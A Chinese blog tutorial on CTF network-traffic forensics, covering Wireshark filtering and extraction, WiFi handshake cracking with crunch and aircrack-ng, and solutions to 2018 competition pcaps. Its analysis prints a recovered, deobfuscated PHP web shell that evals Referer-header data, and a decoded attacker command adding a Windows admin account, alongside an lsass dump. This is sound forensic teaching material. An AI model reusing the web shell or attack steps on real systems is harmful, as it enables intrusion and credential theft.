---
title: CTF-流量分析总结
author: 简文涛
categories:
  - CTF
tags:
  - 流量分析
comments: true
top: true
img: 'https://i.loli.net/2019/07/29/5d3f09fadbac039090.png'
abbrlink: 29176
date: 2019-07-29 22:48:11
update: 2020-03-19 08:37:22
---
## 前言

在CTF比赛中，对于流量包的分析取证是一种十分重要的题型。通常这类题目都是会提供一个包含流量数据的`pcap`文件，选手通过该文件筛选和过滤其中无关的流量信息，根据关键流量信息找出flag或者相关线索,一般flag隐藏在某个数据包里面，或者需要从中提取一个文件出来等等，还有wifi的握手包，需要获取wifi密码等。
## 附件下载
本文章所有题目附件
链接：https://pan.baidu.com/s/18mWo5vn1zp_XbmcQrMOKRA 
提取码：hrc4 

## Wireshark的使用
下载地址：https://www.wireshark.org/download.html
`pcap流量包`的分析通常是通过图形化的网络嗅探器——`Wireshark`进行的.
Wireshark的基本使用分为数据包筛选、数据包搜索、数据包还原、数据提取四个部分。

### 数据包筛选
#### 筛选ip

>源ip筛选

**方法一：**

```
ip.src == 源ip地址
```
![](https://i.loli.net/2020/05/26/2CLPQAcwrMO74lR.png)

**方法二：**
选中一个源IP是筛选条件的数据包，找到`Internet Protocol Version 4`下的`Source`字段。

![](https://i.loli.net/2020/05/26/R8EXACijtesPwx6.png)

右击`Source`字段，再选择`作为过滤器应用` –-> 最后点击`选中`，就可筛选出该源IP的所有包了

>目的ip筛选

**方法一：**

```
ip.dst == 目的ip地址
```
**方法二：**
跟上面源IP筛选方法类似

选中一个源IP是筛选条件的数据包，找到`Internet Protocol Version 4`下的`Destination`字段。

右击`Destination`字段，再选择`作为过滤器应用` –-> 最后点击`选中`，就可筛选出该目的IP的所有包了




#### mac地址筛选
```
eth.dst ==A0:00:00:04:C5:84 筛选目标mac地址

eth.addr==A0:00:00:04:C5:84 筛选MAC地址
```
#### 端口筛选
```
tcp.dstport == 80  筛选tcp协议的目标端口为80的流量包

tcp.srcport == 80  筛选tcp协议的源端口为80的流量包

udp.srcport == 80  筛选udp协议的源端口为80的流量包
```
#### 协议筛选
```
tcp  筛选协议为tcp的流量包

udp 筛选协议为udp的流量包

arp/icmp/http/ftp/dns/ip  筛选协议为arp/icmp/http/ftp/dns/ip的流量包
```
 #### 包长度筛选
```
udp.length ==20   筛选长度为20的udp流量包

tcp.len >=20  筛选长度大于20的tcp流量包

ip.len ==20  筛选长度为20的IP流量包

frame.len ==20 筛选长度为20的整个流量包
```


 #### http请求筛选
```
请求方法为GET：http.request.method==“GET”        筛选HTTP请求方法为GET的 流量包

请求方法为POST：http.request.method==“POST”      筛选HTTP请求方法为POST的流量包

指定URI：http.request.uri==“/img/logo-edu.gif”  筛选HTTP请求的URL为/img/logo-edu.gif的流量包

请求或相应中包含特定内容：http contains “FLAG”    筛选HTTP内容为/FLAG的流量包
```
### 数据包搜索
在wireshark界面按“Ctrl+F”，可以进行关键字搜索：
![](https://i.loli.net/2019/07/30/5d3fea58113cc27049.png)
Wireshark的搜索功能支持正则表达式、字符串、十六进制等方式进行搜索，通常情况下直接使用字符串方式进行搜索。
![](https://i.loli.net/2019/07/30/5d3fea766bdf757318.png)
搜索栏的左边下拉，有分组列表、分组详情、分组字节流三个选项，分别对应wireshark界面的三个部分，搜索时选择不同的选项以指定搜索区域：
![](https://i.loli.net/2019/07/30/5d3fea894fd2b41342.png)
![](https://i.loli.net/2019/07/30/5d3feb75e1ff633564.png)

### 数据包还原

在wireshark中，存在一个追踪流的功能，可以将HTTP或TCP流量集合在一起并还原成原始数据，具体操作方式如下：

选中想要还原的流量包，右键选中，选择追踪流 – TCP流/UPD流/SSL流/HTTP流。
![](https://i.loli.net/2019/07/30/5d3fec2a1ffe286909.png)
可在弹出的窗口中看到被还原的流量信息：
![](https://i.loli.net/2019/07/30/5d3fec3da30b725766.png)
### 数据提取
Wireshark支持提取通过http传输（上传/下载）的文件内容，方法如下：
**自动提取通过http传输的文件内容**
文件->导出对象->HTTP
![](https://i.loli.net/2019/07/30/5d3fef4299a2340378.png)
在打开的对象列表中找到有价值的文件，如压缩文件、文本文件、音频文件、图片等，点击`Save`进行保存，或者`Save All`保存所有对象再进入文件夹进行分析。
![](https://i.loli.net/2019/07/30/5d3ff09081efc85372.png)
**手动提取通过http传输的文件内容**
选中http文件传输流量包，在分组详情中找到`data`,`Line-based text`, `JPEG File Interchange Format`, `data:text/html`层，鼠标右键点击 – 选中 导出分组字节流。
![](https://i.loli.net/2019/07/30/5d3fec6bc7c1160005.png)
如果是菜刀下载文件的流量，需要删除分组字节流前开头和结尾的X@Y字符，否则下载的文件会出错。鼠标右键点击 – 选中 显示分组字节
![](https://i.loli.net/2019/07/30/5d3feccb5e06f13028.png)
在弹出的窗口中设置开始和结束的字节（原字节数开头加3，结尾减3）
![](https://i.loli.net/2019/07/30/5d3fece9cff5192386.png)
最后点击`Save as`按钮导出。

## 流量分析经典题型

CTF题型主要分为流量包修复、数据提取、WEB流量包分析、USB流量包分析、无线密码破解和工控流量包分析等等。
### 入门题型
#### 题目：Cephalopod(图片提取)
题目来源：XCTF 3rd-HITB CTF-2017
考点：图片提取
题目信息：(Cephalopod.pcapng)
![](https://i.loli.net/2019/08/04/Hx8bIAv5sBwGMh2.png)
数据包打开，分组字节流查询flag，发现出现了flag.png的字样，但是并没有这个图片文件，往下翻，图片应该在长度较大的流中，追踪tcp流在tcp.stream eq 2处找到图片文件，保存为原始数据
![](https://i.loli.net/2019/08/04/3E6dxmFe8UgGZiS.png)
删除PNG前面多余部分，保存为1.png
![](https://i.loli.net/2019/08/04/vGfwdaJiFosAcMB.png)
得到flag
![](https://i.loli.net/2019/08/04/XPaTRONVB3rHhug.png)

#### 题目：特殊后门(icmp协议信息传输)
题目来源：第七届山东省大学生网络安全技能大赛
考点：字符串搜索，icmp协议信息传输
题目信息：(backdoor++.pcapng)
![](https://i.loli.net/2019/08/04/tujgxvqKdzTU5VB.png)
搜索flag字符串，在icmp中得到提示flagishere
![](https://i.loli.net/2019/08/04/1hFkt9eKpRba6Ux.png)
之后的每一个icmp包都有含一个flag字符
![](https://i.loli.net/2019/08/04/tMZQbLpDa6s4xkG.png)
![](https://i.loli.net/2019/08/04/lnQiMqzVFjRkNtr.png)
![](https://i.loli.net/2019/08/04/G4yaksrfDHojLcE.png)
![20190804063504144](https://i.loli.net/2020/03/19/rnb8U14PKcSIFBQ.png)
依次查看所有icmp包拼凑字符得到flag
`flag{Icmp_backdoor_can_transfer-some_infomation}`

#### 题目：手机热点(蓝牙传输协议obex,数据提取)
题目来源：第七季极客大挑战
考点：蓝牙传输协议obex,数据提取
题目信息：(Blatand_1.pcapng)
![](https://i.loli.net/2019/08/03/6Omat2B9SxFKQeC.png)
根据题目提示，手机共享，那么应该是蓝牙传输，蓝牙传输协议为**OBEX**，过滤后发现含有一个压缩包
![](https://i.loli.net/2019/08/03/1Rtf57EaYcqXSKz.png)
**方法一**：foremost分离后得到压缩包，解压得到flag.gif
![](https://i.loli.net/2019/08/03/dMnD2amPbjSAUpR.png)
**方法二**：选中含secret.rar包，进行如下操作
![](https://i.loli.net/2019/08/03/Zw7WB9Puflk5yNb.png)
保存为1.rar，解压后得到flag.gif

#### 题目：想蹭网先解开密码(无线密码破解)
题目来源：bugku
考点：无线密码破解
题目信息：(wifi.cap)
![20190804064355455](https://i.loli.net/2020/03/19/XFo5Z3Pfhp9CnOa.png)
下载cap包，WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下
<img src="https://i.loli.net/2020/03/19/whtYRqbp45yCTWj.png" alt="20190804065359243" style="zoom:50%;" />
果然存在四次握手包，直接进行无线密码爆破
创建密码字典：

```
crunch 11 11 -t 1391040%%%% >> wifipass.txt
```
![](https://i.loli.net/2020/05/26/7GgM3H4lmzqbBwy.png)

[Linux下的字典生成工具Crunch](https://www.jianshu.com/p/a3401b0f3d9a)
利用aircrack-ng 进行爆破

```
aircrack-ng -w wifipass.txt wifi.cap
```
![](https://i.loli.net/2020/05/26/ld734RUHzivS1nm.png)
得到flag
`flag{13910407686}`

### 进阶题型

#### 题目：抓到一只苍蝇(数据包筛选,数据提取)

题目来源：bugku
考点：数据包筛选,数据提取
题目信息：(misc_fly.pcapng)
![](https://i.loli.net/2019/08/04/dvqk35xLREbQJiY.png)
首先打开数据包，题目提示了抓到一只苍蝇，试一试搜索苍蝇

```php
http contains "苍蝇"
```
发现一些可疑信息，仔细分析一下发现是在发qq邮件，并且还上传了文件

![](https://i.loli.net/2020/05/26/2Q4RzK7iSk9b6al.png)
既然上传了文件，我们再过滤POST请求试试:

```html
http.request.method==POST
```
可以看到13号数据包调用函数`CreateFile`，然后下面几个可能就是文件内容了，具体是几个，仔细看看URL，738号数据包有个需要调用函数`CheckFile`，并且前面的5个数据包url的路径一样，
所以从第一个开始，后5个数据包是flag.rar内容
![](https://i.loli.net/2019/08/04/jufOL5EAzGamqyZ.png)
我们将分组字节流中的原始数据分别保存为1、2、3、4、5，方便操作
![](https://i.loli.net/2019/08/04/MRlcu5FUpftbY9i.png)
![](https://i.loli.net/2019/08/04/RtDqVbifZ9pkIW3.png)
但是由于TCP包有文件头，我们需要去掉文件头才能将原始数据合成一个文件，
从第一个数据包可以看出来：

![](https://i.loli.net/2020/05/26/OLbXs51z4VMdWCE.png)
文件大小是525701字节，我们需要的这5个数据包的大小(Media Type中可看到):

>131436*4+1777=527521
527521-525701=1820
1820/5=364

tcp包的文件头就为364

然后使用linux的一些工具进行操作即可得到flag.rar
依次把五个文件去掉文件头保存到另一文件
这里使用dd：
```php
dd if=1 bs=1 skip=364 of=1.1

dd命令语法：
if 输入文件名
bs 设置每次读写块的大小为1字节 
skip 指定从输入文件开头跳过多少个块后再开始复制
of 输出文件名
```
![](https://i.loli.net/2019/08/04/EHeORCpsi8rtPGl.png)
然后再用linux的输入流来合并成一个文件：
```php
cat 1.1 2.1 3.1 4.1 5.1 > fly.rar
或者
copy /B 1.1+2.1+3.1+4.1+5.1 fly.rar
```
![](https://i.loli.net/2019/08/04/Q4E1hln8GP7cfgv.png)
然后fly.rar又被伪加密了，所以需要将这个文件用HXD打开后，将其中的74 84改为74 80就能打开了
![](https://i.loli.net/2019/08/04/rGxTJHjyI9Ekadv.png)
解压得到flag.txt，用HXD打开，显示在win32下运行，
![](https://i.loli.net/2019/08/04/bvr9aWfSOtFk6gh.png)
因此改为exe可执行文件后，一堆苍蝇出现了。。。。
binwalk一下发现含有很多图片,foremost提取一下，得到一个二维码
![](https://i.loli.net/2019/08/04/ks5CNP6dHpDRmMO.png)
扫码得到flag
![](https://i.loli.net/2019/08/04/OhnNudsCfvezjK5.png)
### 数据分析题
> 题目一,二,三,四
>题目给了10个流量包，其中只有四个流量包能够分析出有用信息
>为了方便，分为题目一二三四对四个流量包进行了分析

题目详情：
![数据赛.jpg](https://i.loli.net/2019/08/07/JsAOFp6W3XVdCu9.jpg)

#### 题目一(1.pcap)
题目来源：2018信息安全铁人三项数据赛
>题目要求：
1.黑客攻击的第一个受害主机的网卡IP地址
2.黑客对URL的哪一个参数实施了SQL注入
3.第一个受害主机网站数据库的表前缀（加上下划线例如abc_）
4.第一个受害主机网站数据库的名字

打开流量包，流量包有点大，打开比较慢，这里我们先过滤为HTTP协议可以看到`202.1.1.2`对`192.168.1.8`进行了疯狂的爆破
![](https://i.loli.net/2019/08/05/GcwfoVt3QdAT12N.png)
不难看出，黑客利用的SqlMap在对目标站点进行不断的SQL试探注入
因此受害主机的网卡IP地址为**`192.168.1.8 `**
而注入的参数也可以清晰的看见，为**`list[select]`**
![](https://i.loli.net/2019/08/05/sRpy4Y68hKcxoGi.png)
追踪http流，根据回显内容，目标站点数据库抛出的错误，可以清晰的看见
![](https://i.loli.net/2019/08/05/EV4GR7iX8N3D56n.png)
不难确定，目标站点的数据库表名前缀为**`ajtuc_`**
接着为了确定受害主机网站数据库的名字，再进行了一次过滤
```
(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http
```
此时挑选最后一次注入的payload进行url解码
![](https://i.loli.net/2019/08/05/KlpSNg7ykUiRW8D.png)
可以清楚的看到
```sql
FROM joomla.ajtuc_users
```
因此数据库名为**`joomla`**
##### 答案
```
1.黑客攻击的第一个受害主机的网卡IP地址 
192.168.1.8
2.黑客对URL的哪一个参数实施了SQL注入
list[select]
3.第一个受害主机网站数据库的表前缀(加上下划线例如abc_)
ajtuc_
4.第一个受害主机网站数据库的名字
joomla
```
#### 题目二(2.pcap)
题目来源：2018信息安全铁人三项数据赛
>题目要求：
1.黑客第一次获得的php木马的密码是什么
2.黑客第二次上传php木马是什么时间
3.第二次上传的木马通过HTTP协议中的哪个头传递数据

根据题目一已确定目标ip，所以依旧使用以下过滤简化操作
```
(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http
```
可以看到一个奇怪文件`kkkaaa.php`,跟进POST数据查看
![](https://i.loli.net/2019/08/05/8jHueQKlpOmqSzV.png)
不难发现，是中国菜刀的流量,木马密码为**`zzz`**
接着确定黑客第二次上传php木马的时间
我进行了过滤，猜想黑客应该是根据第一个木马来上传的第二个木马
```
(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http.request.method==POST
```
此时一条数据格外引人注目
![](https://i.loli.net/2019/08/05/yGABCPHLEYhDTlb.png)
我们对其16进制进行分析
![](https://i.loli.net/2019/08/05/ck2KV8SRwuLtg7v.png)
将保存的值放入HXD中得到源码
![](https://i.loli.net/2019/08/05/wx6d7rO39npLG4b.png)
将文件保存为php,但是代码经过混淆过的，在代码末尾加上下面两句代码
```php
var_dump($j);
var_dump($x);
```
运行php进行解混淆，发现这就是木马
![](https://i.loli.net/2019/08/05/rASQtJPvzWcw76X.png)
由此可确定这个引人注目的包上传了第二个木马
因此上传时间为:`17:20:44.248365`
美化后
```php
$kh = "cb42";
$kf = "e130";
function x($t, $k)
{
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l;) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t{$i} ^ $k{$j};
        }
    }
    return $o;
}

$r = $_SERVER;
$rr = @$r["HTTP_REFERER"];
$ra = @$r["HTTP_ACCEPT_LANGUAGE"];
if ($rr && $ra) {
    $u = parse_url($rr);
    parse_str($u["query"], $q);
    $q = array_values($q);
    preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/", $ra, $m);
    if ($q && $m) {
        @session_start();
        $s =& $_SESSION;
        $ss = "substr";
        $sl = "strtolower";
        $i = $m[1][0] . $m[1][4];
        $h = $sl($ss(md5($i . $kh), 0, 3));
        $f = $sl($ss(md5($i . $kf), 0, 3));
        $p = "";
        for ($z = 1; $z < count($m[1]); $z++) $p .= $q[$m[2][$z]];
        if (strpos($p, $h) === 0) {
            $s[$i] = "";
            $p = $ss($p, 3);
        }
        if (array_key_exists($i, $s)) {
            $s[$i] .= $p;
            $e = strpos($s[$i], $f);
            if ($e) {
                $k = $kh . $kf;
                ob_start();
                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/", "/-/"), array("/", "+"), $ss($s[$i], 0, $e))), $k)));
                $o = ob_get_contents();
                ob_end_clean();
                $d = base64_encode(x(gzcompress($o), $k));
                print("<$k>$d</$k>");
                @session_destroy();
            }
        }
    }
}
```
容易看到此时有两个与HTTP头有关的参数
```
$rr = @$_SERVER["HTTP_REFERER"];
$ra = @$_SERVER["HTTP_ACCEPT_LANGUAGE"];
```
还是使用过滤
```
(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http
```
然后可以看到许多请求footer.php的页面，点开一个查看详情
![](https://i.loli.net/2019/08/05/Q2YDA5nhXeuzswJ.png)
容易发现referer数据十分可疑，而ACCEPT_LANGUAGE较为正常
所以可以基本确定，木马通过HTTP协议中的**`Referer`**头传递数据
##### 答案
```
1.黑客第一次获得的php木马的密码是什么
zzz
2.黑客第二次上传php木马是什么时间
17:20:44.248365
3.第二次上传的木马通过HTTP协议中的哪个头传递数据
Referer
```
#### 题目三(3.pcap)
题目来源：2018信息安全铁人三项数据赛
>题目要求：
1.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)
2.php代理第一次被使用时最先连接了哪个IP地址

直接进行过滤
```
tcp contains "mysql" && mysql
```
得到大量数据，可以发现黑客应该在对Mysql的登录进行爆破，内网受害机器为192.168.2.20
![](https://i.loli.net/2019/08/06/t7JPeA3UMIhCZbB.png)
我们找到最后一条登录数据
![](https://i.loli.net/2019/08/06/j6nX2DCKaU95l8g.png)
该值就为我们需要的mysql密码hash了
简单过滤一下
```
(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http
```
![](https://i.loli.net/2019/08/06/nQwbGhivlojCWLU.png)
目标机器已经被挂上了tunnel.php，方便外网对内网的访问
为方便查看黑客操作，我们过滤出POST请求
```
(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http.request.method==POST && http
```
![](https://i.loli.net/2019/08/06/rEyKfzhVdJU643R.png)
我们清晰的看见黑客的php代理第一次使用时最先连接4.2.2.2这个ip
##### 答案
```
1.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)
admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4
2.php代理第一次被使用时最先连接了哪个IP地址
4.2.2.2
```
#### 题目四(4.pcap)
题目来源：2018信息安全铁人三项数据赛
>题目要求：
1.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候
2.黑客在内网主机中添加的用户名和密码是多少
3.黑客从内网服务器中下载下来的文件名

为确定黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候，我们继续进行过滤
```
(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && (http contains "dir" || http contains "ls")
```
![](https://i.loli.net/2019/08/07/NsEhGd5zSX4URAc.png)
此时一条为ls，一条为dir，我们先对ls的进行验证
追踪其tcp流
![](https://i.loli.net/2019/08/07/twfXpkbz35TBWQs.png)
发现并没有执行成功,再对dir进行验证
![](https://i.loli.net/2019/08/07/rjAtwsOkp3NCVmx.png)
于是可以确定无误，目标系统为windows，同时dir命令执行成功
时间为：`18:37:38.482420`
既然该192.168.2.20的机器可以执行命令，于是我改变过滤方式，查看黑客如何进行攻击
```
ip.addr == 192.168.2.20 && http
```
不难发现,黑客利用echo命令写入了一个名为sh.php的后门
![](https://i.loli.net/2019/08/07/WJVSYsyMhILcNdp.png)
![](https://i.loli.net/2019/08/07/Jqp7HYyE8kcR3Kh.png)
我们进一步跟进黑客执行的指令，由于是中国菜刀流量，我们选择根据回显明文，猜测指令，这样更有效率
```
ip.src == 192.168.2.20 && http
```
在18:50:09.344660时，我们发现可疑操作,我们发现一条可疑数据，判断黑客应该是执行了`net user`的命令


![](https://i.loli.net/2020/05/26/rGQSdxhlOoqaRUP.png)

然后在18:50:42.908737发现黑客再次执行了net user命令
此时回显为：
![](https://i.loli.net/2020/05/26/72HKPuBf4zEFSY1.png)
看来黑客成功添加了管理员用户kaka
确定了大致的作案时间，我们即可使用过滤

```
ip.addr == 192.168.2.20 && http
```
根据之前的判断，我们可以知道
18:49:27.767754时，不存在kaka用户
18:50:42.908737时，kaka用户已成为管理员
所以可以断定作案时间点在这段时间内
![](https://i.loli.net/2020/05/26/YsqKxMRwrBb7Imc.png)
在此期间，一共4个POST请求，我们挨个查看，果不其然，在第一个POST中就发现了问题

```
Y2QvZCJDOlxwaHBTdHVkeVxXV1dcYjJldm9sdXRpb25caW5zdGFsbFx0ZXN0XCImbmV0IHVzZXIg
a2FrYSBrYWthIC9hZGQmZWNobyBbU10mY2QmZWNobyBbRV0=
```
解码后

```
cd/d"C:\phpStudy\WWW\b2evolution\install\test\"&net user kaka kaka /add&echo [S]&cd&echo [E]
```
可以明显看到
```
net user kaka kaka /add
```
于是可以断定，用户名和密码均为`kaka`
最后一题既然是下载，应该是利用中国菜刀进行下载了，那我们只过滤出post流量，查看命令即可
```
ip.dst == 192.168.2.20 && http.request.method==POST
```
然后我们在数据包的最后发现如下数据
![](https://i.loli.net/2019/08/07/pWs1UZLa4jgNKde.png)
我们将其解码
![](https://i.loli.net/2019/08/07/C6THUuxQFDkrNa5.png)
发现使用了procdump.exe
同时发现文件
![](https://i.loli.net/2019/08/07/GctpnNU1BgS4mJ2.png)
解码得到
![](https://i.loli.net/2019/08/07/3CX9mVkYxTNqsfp.png)
最后我们可以确定，黑客下载了`lsass.exe_180208_185247.dmp`文件

##### 答案

```
1.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候
18:37:38.482420
2.黑客在内网主机中添加的用户名和密码是多少
kaka:kaka
3.黑客从内网服务器中下载下来的文件名
lsass.exe_180208_185247.dmp
```
参考：
[CTF流量分析之wireshark使用](https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489263&amp;idx=1&amp;sn=d9060114d924266ed2bdf4311ca030dd&source=41#wechat_redirect)
[CTF流量分析之题型深度解析](https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489259&amp;idx=1&amp;sn=97faf012f2389dae08407309e3776dd5&source=41#wechat_redirect)
[CTF| 吃个鸡，一起破流量分析题吧！](https://mp.weixin.qq.com/s/rS2KSmMIE2DpWKdYuzFdGg)
[2018年5月5日信息安全铁人三项赛数据赛题解](https://skysec.top/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/#前言)

## 赞助💰

如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭

<table>
  <tbody>
     <tr>
         <td style="text-align:center;">支付宝支付</td>
         <td style="text-align:center;">微信支付</td>
     </tr>
   <tr>
    <td style="text-align:center;" ><img width="200" src="https://jwt1399.top/medias/reward/alipay.png"></td>    
      <td style="text-align:center;"><img width="200" src="https://jwt1399.top/medias/reward/wechat.png"></td>     
  </tr>
</tbody></table>



